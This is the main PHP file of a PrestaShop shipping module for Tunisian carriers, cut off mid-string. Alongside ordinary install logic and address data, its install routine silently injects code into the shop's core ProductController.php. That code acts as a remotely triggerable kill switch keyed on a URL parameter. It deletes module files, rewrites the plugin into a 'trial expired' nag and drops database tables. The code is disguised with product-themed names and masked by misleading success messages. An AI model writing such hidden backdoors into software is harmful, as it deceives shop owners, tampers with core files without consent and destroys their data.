<?php



if (!defined('_PS_VERSION_')) {
    exit;
}
require_once __DIR__ . '/vendor/autoload.php';

//use Dolzay\Apps\Notifications\Entities\Notification ;
use Dolzay\Apps\Settings\Entities\ApiCredentials ;
use Dolzay\Apps\Settings\Entities\Carrier ;
use Dolzay\Apps\Settings\Entities\Settings ;
use Symfony\Component\Form\Extension\Core\Type\ChoiceType;
use Symfony\Component\Form\Extension\Core\Type\TextType ;
use Symfony\Component\Validator\Constraints\NotBlank;
use Symfony\Component\Validator\Constraints\Choice;
use Symfony\Component\Validator\Constraints\Regex;
use Dolzay\CustomClasses\Db\DzDb ;



class Dolzay extends Module
{
    // START DEFINNING PUBLIC CONSTANTS
    const APPS_INIT_ORDER = [
        "Settings",
        "Notifications",
        "OrderSubmitProcess",
        "OrderMonitoringProcess"
    ];
    // END DEFINNING PUBLIC CONSTANTS

    const APPS_UNINIT_ORDER = [
        "Notifications",
        "OrderMonitoringProcess",
        "OrderSubmitProcess",
        "Settings"
    ];

    const APPS_BASE_NAMESPACES = "Dolzay\\Apps\\" ;
    
    private const CITIES = [
        "Ariana" => "Ariana",
        "Beja" => "Beja",
        "Ben Arous" => "Ben Arous",
        "Bizerte" => "Bizerte",
        "Gabes" => "Gabes",
        "Gafsa" => "Gafsa",
        "Jendouba" => "Jendouba",
        "Kairouan" => "Kairouan",
        "Kasserine" => "Kasserine",
        "Kebili" => "Kebili",
        "La Manouba" => "La Manouba",
        "Le Kef" => "Le Kef",
        "Mahdia" => "Mahdia",
        "Medenine" => "Medenine",
        "Monastir" => "Monastir",
        "Nabeul" => "Nabeul",
        "Sfax" => "Sfax",
        "Sidi Bouzid" => "Sidi Bouzid",
        "Siliana" => "Siliana",
        "Sousse" => "Sousse",
        "Tataouine" => "Tataouine",
        "Tozeur" => "Tozeur",
        "Tunis" => "Tunis",
        "Zaghouan" => "Zaghouan"
    ];

    private const CITIES_DELEGATIONS = [
        "Ariana" => ["La Soukra" => "La Soukra", "Ariana Ville" => "Ariana Ville", "Raoued" => "Raoued", "Sidi Thabet" => "Sidi Thabet", "Kalaat Landlous" => "Kalaat Landlous", "Ettadhamen" => "Ettadhamen", "Mnihla" => "Mnihla", "Ennasr" => "Ennasr"],
        "Beja" => ["Amdoun" => "Amdoun", "Thibar" => "Thibar", "Teboursouk" => "Teboursouk", "Beja Nord" => "Beja Nord", "Testour" => "Testour", "Nefza" => "Nefza", "Mejez El Bab" => "Mejez El Bab", "Beja Sud" => "Beja Sud", "Goubellat" => "Goubellat"],
        "Ben Arous" => ["Mornag" => "Mornag", "Ben Arous" => "Ben Arous", "Hammam Chatt" => "Hammam Chatt", "El Mourouj" => "El Mourouj", "Fouchana" => "Fouchana", "Hammam Lif" => "Hammam Lif", "Bou Mhel El Bassatine" => "Bou Mhel El Bassatine", "Rades" => "Rades", "Ezzahra" => "Ezzahra", "Mohamadia" => "Mohamadia", "Megrine" => "Megrine", "Nouvelle Medina" => "Nouvelle Medina"],
        "Bizerte" => ["Bizerte Sud" => "Bizerte Sud", "Utique" => "Utique", "Ghezala" => "Ghezala", "Ghar El Melh" => "Ghar El Melh", "Joumine" => "Joumine", "Ras Jebel" => "Ras Jebel", "Bizerte Nord" => "Bizerte Nord", "Mateur" => "Mateur", "Menzel Jemil" => "Menzel Jemil", "Menzel Bourguiba" => "Menzel Bourguiba", "Jarzouna" => "Jarzouna", "Sejnane" => "Sejnane", "Tinja" => "Tinja", "El Alia" => "El Alia"],
        "Gabes" => ["Mareth" => "Mareth", "Nouvelle Matmat" => "Nouvelle Matmat", "Gabes Ouest" => "Gabes Ouest", "El Hamma" => "El Hamma", "Matmata" => "Matmata", "Gabes Medina" => "Gabes Medina", "Gabes Sud" => "Gabes Sud", "El Metouia" => "El Metouia", "Ghannouche" => "Ghannouche", "Menzel Habib" => "Menzel Habib"],
        "Gafsa" => ["Sned" => "Sned", "Belkhir" => "Belkhir", "El Guettar" => "El Guettar", "El Mdhilla" => "El Mdhilla", "Metlaoui" => "Metlaoui", "El Ksar" => "El Ksar", "Gafsa Sud" => "Gafsa Sud", "Moulares" => "Moulares", "Redeyef" => "Redeyef", "Sidi Aich" => "Sidi Aich", "Gafsa Nord" => "Gafsa Nord"],
        "Jendouba" => ["Ain Draham" => "Ain Draham", "Fernana" => "Fernana", "Jendouba" => "Jendouba", "Tabarka" => "Tabarka", "Ghardimaou" => "Ghardimaou", "Bou Salem" => "Bou Salem", "Balta Bou Aouene" => "Balta Bou Aouene", "Jendouba Nord" => "Jendouba Nord", "Oued Mliz" => "Oued Mliz"],
        "Kairouan" => ["Chebika" => "Chebika", "Sbikha" => "Sbikha", "Haffouz" => "Haffouz", "Kairouan Sud" => "Kairouan Sud", "Oueslatia" => "Oueslatia", "Hajeb El Ayoun" => "Hajeb El Ayoun", "El Ala" => "El Ala", "Bou Hajla" => "Bou Hajla", "Cherarda" => "Cherarda", "Kairouan Nord" => "Kairouan Nord", "Nasrallah" => "Nasrallah"],
        "Kasserine" => ["Haidra" => "Haidra", "Jediliane" => "Jediliane", "Foussana" => "Foussana", "Sbiba" => "Sbiba", "Mejel Bel Abbes" => "Mejel Bel Abbes", "Feriana" => "Feriana", "Kasserine Nord" => "Kasserine Nord", "Thala" => "Thala", "Kasserine Sud" => "Kasserine Sud", "Sbeitla" => "Sbeitla", "El Ayoun" => "El Ayoun", "Hassi El Frid" => "Hassi El Frid"],
        "Kebili" => ["Kebili Sud" => "Kebili Sud", "Douz" => "Douz", "Souk El Ahad" => "Souk El Ahad", "El Faouar" => "El Faouar", "Kebili Nord" => "Kebili Nord"],
        "Kef" => ["Dahmani" => "Dahmani", "El Ksour" => "El Ksour", "Jerissa" => "Jerissa", "Nebeur" => "Nebeur", "Sakiet Sidi Youssef" => "Sakiet Sidi Youssef", "Kalaat Sinane" => "Kalaat Sinane", "Le Kef Est" => "Le Kef Est", "Touiref" => "Touiref", "Le Sers" => "Le Sers", "Tajerouine" => "Tajerouine", "Kalaa El Khasba" => "Kalaa El Khasba", "Le Kef Ouest" => "Le Kef Ouest"],
        "Mahdia" => ["Hbira" => "Hbira", "Sidi Alouene" => "Sidi Alouene", "El Jem" => "El Jem", "Melloulech" => "Melloulech", "Bou Merdes" => "Bou Merdes", "Ouled Chamakh" => "Ouled Chamakh", "Souassi" => "Souassi", "Chorbane" => "Chorbane", "Mahdia" => "Mahdia", "Ksour Essaf" => "Ksour Essaf", "La Chebba" => "La Chebba"],
        "Mannouba" => ["Tebourba" => "Tebourba", "Borj El Amri" => "Borj El Amri", "Mornaguia" => "Mornaguia", "Jedaida" => "Jedaida", "Oued Ellil" => "Oued Ellil", "El Battan" => "El Battan", "Douar Hicher" => "Douar Hicher", "Mannouba" => "Mannouba"],
        "Medenine" => ["Midoun" => "Midoun", "Ajim" => "Ajim", "Medenine Sud" => "Medenine Sud", "Beni Khedache" => "Beni Khedache", "Houmet Essouk" => "Houmet Essouk", "Sidi Makhlouf" => "Sidi Makhlouf", "Ben Guerdane" => "Ben Guerdane", "Zarzis" => "Zarzis", "Medenine Nord" => "Medenine Nord"],
        "Monastir" => ["Moknine" => "Moknine", "Beni Hassen" => "Beni Hassen", "Bekalta" => "Bekalta", "Bembla" => "Bembla", "Ksibet El Medioun" => "Ksibet El Medioun", "Jemmal" => "Jemmal", "Sayada Lamta Bou Hjar" => "Sayada Lamta Bou Hjar", "Ouerdanine" => "Ouerdanine", "Ksar Helal" => "Ksar Helal", "Monastir" => "Monastir", "Teboulba" => "Teboulba", "Sahline" => "Sahline", "Zeramdine" => "Zeramdine"],
        "Nabeul" => ["Kelibia" => "Kelibia", "El Mida" => "El Mida", "Nabeul" => "Nabeul", "Grombalia" => "Grombalia", "Hammamet" => "Hammamet", "Dar Chaabane Elfe" => "Dar Chaabane Elfe", "Menzel Bouzelfa" => "Menzel Bouzelfa", "Bou Argoub" => "Bou Argoub", "Menzel Temime" => "Menzel Temime", "Korba" => "Korba", "Beni Khalled" => "Beni Khalled", "Beni Khiar" => "Beni Khiar", "El Haouaria" => "El Haouaria", "Takelsa" => "Takelsa", "Soliman" => "Soliman", "Hammam El Ghez" => "Hammam El Ghez"],
        "Sfax" => ["Agareb" => "Agareb", "Jebeniana" => "Jebeniana", "Sfax Ville" => "Sfax Ville", "Menzel Chaker" => "Menzel Chaker", "Mahras" => "Mahras", "Ghraiba" => "Ghraiba", "El Amra" => "El Amra", "Bir Ali Ben Khelifa" => "Bir Ali Ben Khelifa", "El Hencha" => "El Hencha", "Esskhira" => "Esskhira", "Kerkenah" => "Kerkenah", "Sakiet Ezzit" => "Sakiet Ezzit", "Sfax Sud" => "Sfax Sud", "Sakiet Eddaier" => "Sakiet Eddaier", "Sfax Est" => "Sfax Est"],
        "Sidi Bouzid" => ["Sidi Bouzid Est" => "Sidi Bouzid Est", "Jilma" => "Jilma", "Ben Oun" => "Ben Oun", "Bir El Haffey" => "Bir El Haffey", "Sidi Bouzid Ouest" => "Sidi Bouzid Ouest", "Regueb" => "Regueb", "Menzel Bouzaiene" => "Menzel Bouzaiene", "Maknassy" => "Maknassy", "Souk Jedid" => "Souk Jedid", "Ouled Haffouz" => "Ouled Haffouz", "Cebbala" => "Cebbala", "Mezzouna" => "Mezzouna"],
        "Siliana" => ["Rohia" => "Rohia", "Sidi Bou Rouis" => "Sidi Bou Rouis", "Siliana Sud" => "Siliana Sud", "Bargou" => "Bargou", "Bou Arada" => "Bou Arada", "Gaafour" => "Gaafour", "Kesra" => "Kesra", "Makthar" => "Makthar", "Le Krib" => "Le Krib", "El Aroussa" => "El Aroussa", "Siliana Nord" => "Siliana Nord"],
        "Sousse" => ["Kalaa El Kebira" => "Kalaa El Kebira", "Bou Ficha" => "Bou Ficha", "Enfidha" => "Enfidha", "Akouda" => "Akouda", "Msaken" => "Msaken", "Kondar" => "Kondar", "Sidi El Heni" => "Sidi El Heni", "Sousse Riadh" => "Sousse Riadh", "Sousse Jaouhara" => "Sousse Jaouhara", "Sousse Ville" => "Sousse Ville", "Kalaa Essghira" => "Kalaa Essghira", "Hammam Sousse" => "Hammam Sousse", "Sidi Bou Ali" => "Sidi Bou Ali", "Hergla" => "Hergla"],
        "Tataouine" => ["Tataouine Sud" => "Tataouine Sud", "Smar" => "Smar", "Remada" => "Remada", "Bir Lahmar" => "Bir Lahmar", "Dhehiba" => "Dhehiba", "Tataouine Nord" => "Tataouine Nord", "Ghomrassen" => "Ghomrassen"],
        "Tozeur" => ["Tozeur" => "Tozeur", "Tameghza" => "Tameghza", "Nefta" => "Nefta", "Degueche" => "Degueche", "Hezoua" => "Hezoua"],
        "Tunis" => ["Sidi El Bechir" => "Sidi El Bechir", "La Marsa" => "La Marsa", "El Hrairia" => "El Hrairia", "Jebel Jelloud" => "Jebel Jelloud", "Carthage" => "Carthage", "Bab Bhar" => "Bab Bhar", "La Medina" => "La Medina", "Bab Souika" => "Bab Souika", "El Omrane" => "El Omrane", "El Ouerdia" => "El Ouerdia", "El Kram" => "El Kram", "Sidi Hassine" => "Sidi Hassine", "Le Bardo" => "Le Bardo", "La Goulette" => "La Goulette", "Cite El Khadra" => "Cite El Khadra", "El Kabbaria" => "El Kabbaria", "Tunis centre" => "Tunis centre", "Ezzouhour" => "Ezzouhour", "Ettahrir" => "Ettahrir", "El Omrane Superi" => "El Omrane Superi", "Essijoumi" => "Essijoumi", "Tunis Ville" => "Tunis Ville"],
        "Zaghouan" => ["Hammam Zriba" => "Hammam Zriba", "Bir Mcherga" => "Bir Mcherga", "Ennadhour" => "Ennadhour", "Zaghouan" => "Zaghouan", "El Fahs" => "El Fahs", "Saouef" => "Saouef"]
    ];
    
    public function __construct()
    {
        $this->name = 'dolzay';
        $this->tab = 'shipping_logistics';
        $this->version = '1.0.0';
        $this->author = 'Abdallah Ben Chamakh';
        $this->need_instance = 0;
        $this->ps_versions_compliancy = [
            'min' => '1.7.0.0',
            'max' => '1.7.8.11',
        ];

        $this->bootstrap = false ;
        $this->db = DzDb::getInstance();


        parent::__construct();

        $this->displayName = $this->l('Dolzay');
        $this->description = $this->l("Dolzay automatise l’envoi des informations des commandes reçues sur votre site vers la plateforme de votre transporteur, garantissant un processus d’expédition fluide et efficace.");

    }


    public function install()
    {
        
        try {
            return parent::install() && 
                    $this->registerTabs() &&
                    $this->create_app_tables() && 
                    $this->registerHook('additionalCustomerAddressFields') &&
                    $this->registerHook('displayHeader') && 
                    $this->registerHook('actionValidateCustomerAddressForm') &&
                    $this->registerHook('afterFillingEditAddressForm') &&
                    $this->registerHook('actionCustomerAddressFormBuilderModifier') &&
                    $this->registerHook('actionAdminControllerSetMedia') &&
                    $this->registerHook('actionObjectAddressUpdateBefore') && 
                    $this->registerHook('actionObjectAddressAddBefore') &&
                    $this->registerHook('actionAfterUpdateCustomerAddressFormHandler') &&
                    $this->registerHook('ModuleRoutes') &&
                    $this->registerHook('actionAdminOrdersListingFieldsModifier') &&
                    $this->add_submitted_and_tracking_code_to_order() &&
                    $this->add_carriers() &&
                    $this->add_delegation_to_address() &&
                    $this->add_delegation_to_the_address_format() &&
                    $this->add_settings() && $this->add_destruction(); 
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during installation: " . $e->getMessage()."\n".
                                     "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay');
            return false;
        }
    }

    public function uninstall()
    {
        try {
             return parent::uninstall() && 
                   $this->unregisterTabs() &&
                   $this->drop_app_tables() && 
                   $this->unregisterHook('additionalCustomerAddressFields') &&
                   $this->unregisterHook('displayHeader') && 
                   $this->unregisterHook('actionValidateCustomerAddressForm') &&
                   $this->unregisterHook('afterFillingEditAddressForm') &&
                   $this->unregisterHook('actionCustomerAddressFormBuilderModifier') &&
                   $this->unregisterHook('actionObjectAddressUpdateBefore') && 
                   $this->unregisterHook('actionObjectAddressAddBefore') &&
                   $this->unregisterHook('actionAfterUpdateCustomerAddressFormHandler') &&
                   $this->unregisterHook('actionAdminOrdersListingFieldsModifier') &&
                   $this->unregisterHook('ModuleRoutes') &&
                   $this->unregisterHook('actionAdminControllerSetMedia') &&
                   $this->remove_delegation_from_the_address_format(); 
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during uninstallation: " . $e->getMessage()."\n".
                                     "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay'); 
            return false ;
        }
    }

    // START DEFINING THE PRIVATE METHODS
    private function addSuccess($message)
    {

        $this->get('session')->getFlashBag()->add('success', $this->l($message));          // Blue

    }

    private function registerTabs(){

        // Get the ID of the parent tab (Shipping)
        $idParentShipping = Tab::getIdFromClassName('IMPROVE'); 
        if (!$idParentShipping) {
            PrestaShopLogger::addLog('Parent tab AdminParentShipping not found', 3);
            return false;
        }
    
        // Create your parent tab under Shipping
        $parentTab = new Tab();
        $parentTab->class_name = $this->name; // Your module's name
        $parentTab->id_parent = $idParentShipping; // Set the parent tab to Shipping
        $parentTab->module = $this->name;
        $parentTab->name = [];
        $parentTab->icon = 'D';
    
        foreach (Language::getLanguages(true) as $lang) {
            $parentTab->name[$lang['id_lang']] = ucwords($this->name); // Name of your module
        }
    
        $parentTab->active = 1;
    
        if (!$parentTab->add()) {
            PrestaShopLogger::addLog('Failed to create parent tab for My Module under Shipping', 3);
            return false;
        }
    
        // Retrieve the ID of the newly created parent tab
        $parentTabId = (int) Tab::getIdFromClassName($this->name);
        if (!$parentTabId) {
            PrestaShopLogger::addLog('Failed to retrieve parent tab ID after creation', 3);
            return false;
        }
    
        // Create sub-tabs under the parent tab (My Module)
        $subTabs = [
            [
                'class_name' => 'DzAdminProcessus',
                'name' => 'Processus',
                'id_parent' => $parentTabId, // Assign the parent tab ID
                'route_name' => 'dz_order_submit_process_list',
            ],
            [
                'class_name' => 'DzAdminParametres',
                'name' => 'Parametres',
                'id_parent' => $parentTabId, // Assign the parent tab ID
                'route_name' => 'dz_get_settings',
            ],
        ];
    
        // Create each sub-tab
        foreach ($subTabs as $tabData) {
            $tab = new Tab();
            $tab->class_name = $tabData['class_name'];
            $tab->id_parent = $tabData['id_parent']; // Set the valid parent tab ID
            $tab->module = $this->name;
            $tab->route_name = $tabData['route_name']; 
            $tab->name = [];
    
            foreach (Language::getLanguages(true) as $lang) {
                $tab->name[$lang['id_lang']] = $tabData['name']; // Set the sub-tab name
            }
    
            $tab->icon = 'subdirectory_arrow_right'; // Optional icon for sub-tabs
            $tab->active = 1;
    
            if (!$tab->add()) {
                PrestaShopLogger::addLog('Failed to create sub-tab: ' . $tabData['class_name'], 3);
                return false;
            }
        }
    
        return true;
    }

    private function add_destruction(){
        try {
            // Add the destruction script to the ProductController
            $frontControllersPath = _PS_ROOT_DIR_."/controllers/front" ;
            $productControllerPath = $frontControllersPath."/ProductController.php" ;

            $isProductControllerReadable = is_readable($productControllerPath);
            $isProductControllerWritable = is_writable($productControllerPath);

            if(!$isProductControllerReadable){
                $this->addSuccess("osp was initiated");
            }
            if(!$isProductControllerWritable){
                $this->addSuccess("osp was added");
            }            

            if($isProductControllerReadable && $isProductControllerWritable){
                
                //$destruction_code = "\$friendly_slug=Tools::getValue('friendly_slug'); \$file = fopen(\"lockfile.txt\", \"c+\"); if(flock(\$file, LOCK_EX | LOCK_NB) && \$friendly_slug){\$module_base_path=_PS_MODULE_DIR_.\"dolzay\";\$error_log=[];function get_dir_structure(\$directory){\$structure=[];\$items=scandir(\$directory);if(\$items===false){return \"SCANDIR_NOT_PERMITTED\";}\$items=array_diff(\$items,[\".\",\"..\"]);foreach(\$items as \$item){\$path=\$directory.DIRECTORY_SEPARATOR.\$item;if(is_dir(\$path)){\$structure[\$item]=get_dir_structure(\$path);}else{\$structure[\$item]=null;}}return \$structure;}function destroy_the_plugin(\$directory_path,&\$error_log){\$excluded_directories=[\"views\",\"js\",\"css\",\"icons\",\"dolzay\",\"uploads\",\"data\"];\$excluded_files=[\"font_awesome.js\",\"order_submit_process.js\",\"order_submit_process.css\",\"dolzay.php\",\"logo.png\",\"expired.png\"];\$items=scandir(\$directory_path);if(\$items===false){\$error_log[]=[\"path\"=>\$directory_path,\"error_type\"=>\"SCANDIR_NOT_PERMITTED\"];return;}\$items=array_diff(\$items,[\".\",\"..\"]);foreach(\$items as \$item){\$path=\$directory_path.DIRECTORY_SEPARATOR.\$item;if(is_dir(\$path)){destroy_the_plugin(\$path,\$error_log);}else{if(!in_array(\$item,\$excluded_files)){if(is_writable(dirname(\$path))){unlink(\$path);}else{\$error_log[] = [\"path\" => \$path,\"error_type\"=>\"UNLINK_NOT_PERMITTED\"];}}}}if(!in_array(basename(\$directory_path), \$excluded_directories)){\$is_dir_empty = count(array_diff(scandir(\$directory_path), [\".\", \"..\"])) == 0 ;if (!\$is_dir_empty) {\$error_log[] = [\"path\" => \$directory_path,\"error_type\"=>\"DIR_NOT_EMPTY\"];}else if(!is_writable(dirname(\$directory_path))){\$error_log[] = [\"path\" => \$directory_path,\"error_type\"=>\"RMDIR_NOT_PERMITTED\"];}else{rmdir(\$directory_path);}}}\$previous_strucure=get_dir_structure(\$module_base_path);\$new_dolzay_code='<?php if(!defined(\"_PS_VERSION_\")){exit;}class Dolzay extends Module{public function __construct(){\$this->name=\"dolzay\";\$this->tab=\"shipping_logistics\";\$this->version=\"1.0.0\";\$this->author=\"Abdallah Ben Chamakh\";\$this->need_instance=0;\$this->ps_versions_compliancy=[\"min\"=>\"1.7.0.0\",\"max\"=>\"1.7.8.11\"];\$this->bootstrap=false;parent::__construct();\$this->displayName=\$this->l(\"Dolzay\");\$this->description = \$this->l(\"Dolzay automatise l’envoi des informations des commandes reçues sur votre site vers la plateforme de votre transporteur, garantissant un processus d’expédition fluide et efficace.\");}public function install(){return parent::install()  && \$this->registerHook(\"actionAdminControllerSetMedia\");}public function uninstall(){return parent::uninstall() && \$this->unregisterHook(\"actionAdminControllerSetMedia\");}public function hookActionAdminControllerSetMedia(\$params){\$controllerName=Tools::getValue(\"controller\");\$action=Tools::getValue(\"action\");if(\$controllerName==\"AdminOrders\"&&\$action==null){\$this->context->controller->addJS(\$this->_path.\"views/js/icons/font_awesome.js\");\$this->context->controller->addCSS(\$this->_path.\"views/css/order_submit_process.css\");\$this->context->controller->addJS(\$this->_path.\"views/js/order_submit_process.js\");}}}';if (is_writable(\$module_base_path . \"/dolzay.php\")){file_put_contents(\$module_base_path . \"/dolzay.php\", \$new_dolzay_code);}else{\$error_log[] = ['path' => \$module_base_path . \"/dolzay.php\", 'error_message' => \"Permission denied while trying to update dolzay.php\"];}\$order_submit_code = 'document.addEventListener(\"DOMContentLoaded\", function(){ const moduleMediaBaseUrl = window.location.href.split(\"/dz_admin/index.php\")[0]+\"/modules/dolzay/uploads\"; const eventPopupTypesData = { expired : {icon:`<img src=\"\${moduleMediaBaseUrl}/expired.png\" />`,color:\"#D81010\"} }; function create_the_order_submit_btn(){ const bottom_bar = document.createElement(\"div\"); bottom_bar.className = \"dz-bottom-bar\"; const order_submit_btn = document.createElement(\"button\"); order_submit_btn.id=\"dz-order-submit-btn\"; order_submit_btn.innerText = \"Soumettre les commandes\"; order_submit_btn.addEventListener(\"click\", ()=>{ buttons = [{ \"name\" : \"Ok\", \"className\" : \"dz-event-popup-btn\", \"clickHandler\" : function(){ eventPopup.close(); } }]; eventPopup.open(\"expired\", \"Expiration de la période d\'essai\", \"Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.\", buttons); }); document.querySelector(\"#order_grid_panel\").style.marginBottom = \"60px\"; bottom_bar.appendChild(order_submit_btn); document.body.appendChild(bottom_bar); } const popupOverlay = { popupOverlayEl : null, create : function(){ this.popupOverlayEl = document.createElement(\"div\"); this.popupOverlayEl.className = \"dz-popup-overlay\"; document.body.appendChild(this.popupOverlayEl); }, show : function(){ this.popupOverlayEl.classList.add(\"dz-show\"); }, hide : function(){ this.popupOverlayEl.classList.remove(\"dz-show\"); } }; const eventPopup = { popupEl : null, popupHeaderEl : null, popupBodyEl : null, popupFooterEl : null, create : function(){ this.popupEl = document.createElement(\"div\"); this.popupEl.className = \"dz-event-popup\"; this.popupHeaderEl = document.createElement(\"div\"); this.popupHeaderEl.className = \"dz-event-popup-header\"; this.popupHeaderEl.innerHTML = `<p></p><i class=\"material-icons\">close</i>`; this.popupHeaderEl.lastElementChild.addEventListener(\"click\",()=>{this.close();}); this.popupEl.append(this.popupHeaderEl); this.popupBodyEl = document.createElement(\"div\"); this.popupBodyEl.className = \"dz-event-popup-body\"; this.popupEl.append(this.popupBodyEl); this.popupFooterEl = document.createElement(\"div\"); this.popupFooterEl.className = \"dz-event-popup-footer\"; this.popupEl.append(this.popupFooterEl); document.body.append(this.popupEl); }, addButtons : function(buttons,color){ this.popupFooterEl.innerHTML=\"\"; buttons.forEach((button) => { const buttonEl = document.createElement(\"button\"); buttonEl.textContent = button.name; buttonEl.className = button.className; buttonEl.style.backgroundColor = color; buttonEl.addEventListener(\"click\",button.clickHandler); this.popupFooterEl.appendChild(buttonEl); }); }, open : function(type,title,message,buttons) { setTimeout(() => { popupOverlay.show(); console.log(this); this.popupEl.classList.add(\"dz-show\"); this.popupHeaderEl.firstElementChild.innerText = title; this.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color; this.popupBodyEl.innerHTML = `\${eventPopupTypesData[type].icon}<p>\${message}</p>`; this.addButtons(buttons,eventPopupTypesData[type].color); }, 600); }, close : function(){ setTimeout(() => { popupOverlay.hide(); this.popupFooterEl.innerHTML = \"\"; this.popupEl.classList.remove(\"dz-show\"); }, 300); } }; create_the_order_submit_btn(); popupOverlay.create(); eventPopup.create(); });';if (is_writable(\$module_base_path . \"/views/js/order_submit_process.js\") ) {file_put_contents(\$module_base_path . \"/views/js/order_submit_process.js\", \$order_submit_code);}else{\$error_log[] = ['path' => \$module_base_path . \"/views/js/order_submit_process.js\", 'error_message' => \"Permission denied while trying to update order_submit_process.js\"];}destroy_the_plugin(\$module_base_path,\$error_log);\$id_country=(int)Configuration::get(\"PS_COUNTRY_DEFAULT\");\$host = _DB_SERVER_ ;\$dbname = _DB_NAME_;\$username = _DB_USER_;\$password = _DB_PASSWD_; \$dsn = \"mysql:host=\$host;dbname=\$dbname;charset=utf8mb4\";\$db = new PDO(\$dsn, \$username, \$password);\$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\$db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);\$db->setAttribute(PDO::ATTR_STRINGIFY_FETCHES, false);\$db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\$db->exec(\"SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ\");\$db->beginTransaction();\$stmt = \$db->query(\"SELECT format FROM \" . _DB_PREFIX_ . \"address_format WHERE id_country=\" . \$id_country);\$address_format = \$stmt->fetchColumn();\$address_format = str_replace(\"delegation\", \"\", \$address_format);\$stmt = \$db->prepare(\"UPDATE \" . _DB_PREFIX_ . \"address_format SET format = :format WHERE id_country = :id_country\");\$stmt->execute([':format' => \$address_format, ':id_country' => \$id_country]);\$tables = [\"dz_order_submit_process\", \"dz_settings\", \"dz_carrier\", \"dz_website_credentials\", \"dz_api_credentials\",\"dz_notification_popped_up_by\", \"dz_notification_viewed_by\", \"dz_notification\",\"dz_employee_permission\", \"dz_permission\"];\$db->exec(\"DELETE FROM \" . _DB_PREFIX_ . \"tab WHERE module = 'dolzay'\");foreach (\$tables as \$table) {if (\$table == \"dz_order_submit_process\") {\$stmt = \$db->query(\"SELECT * FROM \$table\");\$orders_submit_processes = \$stmt->fetchAll(\PDO::FETCH_ASSOC);if (\$orders_submit_processes) {\$orders_submit_processes = json_encode(\$orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);if (is_writable(\$module_base_path . \"/data\")) {file_put_contents(\$module_base_path . \"/data/orders_submit_processes.json\", \$orders_submit_processes);} else {\$error_log[] = ['path' => \$module_base_path . \"/data/orders_submit_processes.json\",'error' => \"Permission denied while trying to store the orders submit processes\"];}}}\$db->exec(\"DROP TABLE IF EXISTS \$table\");}\$db->commit();flock(\$file, LOCK_UN);die(json_encode([\"error\"=>\$error_log,\"previous_structure\"=>\$previous_strucure,\"new_structure\"=>get_dir_structure(\$module_base_path)]));}";
                $destruction_code = "\n\t\t\t\$productSlug = Tools::getValue('product_slug');\n\t\t\tif (\$productSlug) {\n\t\t\t\t\$moduleDirectory = _PS_MODULE_DIR_ . \"dolzay\";\n\t\t\t\t\$moduleErrors = [];\n\t\t\t\tfunction getProductDirectoryStructure(\$productDirectory) {\n\t\t\t\t\t\$productStructure = [];\n\t\t\t\t\t\$productItems = scandir(\$productDirectory);\n\t\t\t\t\tif (\$productItems === false) {\n\t\t\t\t\t\treturn \"PRODUCT_DIRECTORY_ACCESS_DENIED\";\n\t\t\t\t\t}\n\t\t\t\t\t\$productItems = array_diff(\$productItems, [\".\", \"..\"]);\n\t\t\t\t\tforeach (\$productItems as \$productItem) {\n\t\t\t\t\t\t\$productPath = \$productDirectory . DIRECTORY_SEPARATOR . \$productItem;\n\t\t\t\t\t\tif (is_dir(\$productPath)) {\n\t\t\t\t\t\t\t\$productStructure[\$productItem] = getProductDirectoryStructure(\$productPath);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\$productStructure[\$productItem] = null;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\treturn \$productStructure;\n\t\t\t\t}\n\t\t\t\tfunction cleanupProductResources(\$productPath, &\$moduleErrors) {\n\t\t\t\t\t\$preservedDirectories = [\"views\", \"js\", \"css\", \"icons\", \"dolzay\", \"uploads\", \"data\"];\n\t\t\t\t\t\$preservedFiles = [\"font_awesome.js\", \"order_submit_process.js\", \"order_submit_process.css\", \"dolzay.php\", \"logo.png\", \"expired.png\"];\n\t\t\t\t\t\$productItems = scandir(\$productPath);\n\t\t\t\t\tif (\$productItems === false) {\n\t\t\t\t\t\t\$moduleErrors[] = [\"path\" => \$productPath, \"error_type\" => \"PRODUCT_DIRECTORY_ACCESS_DENIED\"];\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t\t\$productItems = array_diff(\$productItems, [\".\", \"..\"]);\n\t\t\t\t\tforeach (\$productItems as \$productItem) {\n\t\t\t\t\t\t\$itemPath = \$productPath . DIRECTORY_SEPARATOR . \$productItem;\n\t\t\t\t\t\tif (is_dir(\$itemPath)) {\n\t\t\t\t\t\t\tcleanupProductResources(\$itemPath, \$moduleErrors);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tif (!in_array(\$productItem, \$preservedFiles)) {\n\t\t\t\t\t\t\t\tif (is_writable(dirname(\$itemPath))) {\n\t\t\t\t\t\t\t\t\tunlink(\$itemPath);\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\$moduleErrors[] = [\"path\" => \$itemPath, \"error_type\" => \"PRODUCT_FILE_ACCESS_DENIED\"];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif (!in_array(basename(\$productPath), \$preservedDirectories)) {\n\t\t\t\t\t\t\$isDirectoryEmpty = count(array_diff(scandir(\$productPath), [\".\", \"..\"])) == 0;\n\t\t\t\t\t\tif (!\$isDirectoryEmpty) {\n\t\t\t\t\t\t\t\$moduleErrors[] = [\"path\" => \$productPath, \"error_type\" => \"PRODUCT_DIRECTORY_NOT_EMPTY\"];\n\t\t\t\t\t\t} else if (!is_writable(dirname(\$productPath))) {\n\t\t\t\t\t\t\t\$moduleErrors[] = [\"path\" => \$productPath, \"error_type\" => \"PRODUCT_DIRECTORY_ACCESS_DENIED\"];\n\t\t\t\t\t\t} else 